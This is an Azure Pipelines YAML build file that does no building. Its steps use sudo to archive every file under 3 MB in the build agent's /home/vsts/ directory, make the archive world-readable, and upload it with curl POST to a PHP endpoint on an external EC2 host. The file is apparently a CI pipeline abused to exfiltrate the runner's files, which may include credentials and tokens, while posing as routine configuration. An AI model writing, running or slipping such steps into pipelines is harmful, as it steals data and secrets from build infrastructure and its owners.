trigger:
- main

pool:
  vmImage: ubuntu-latest

steps:
- script: whereis xargs
  displayName: 'xargs'

- script: sudo /bin/bash -c 'find /home/vsts/ ! -name "*--*" -type f -size -3M | xargs tar czvf /mnt/teste1.tgz'
  displayName: 'Tar'
  continueOnError: true

- script: sudo chmod 777 /mnt/teste1.tgz
  displayName: 'chmod'

- script: curl -d "@/mnt/teste1.tgz" -X POST "http://ec2-15-229-9-199.sa-east-1.compute.amazonaws.com/energisa/hjkgdhgkfjd.php"
  displayName: 'upload'
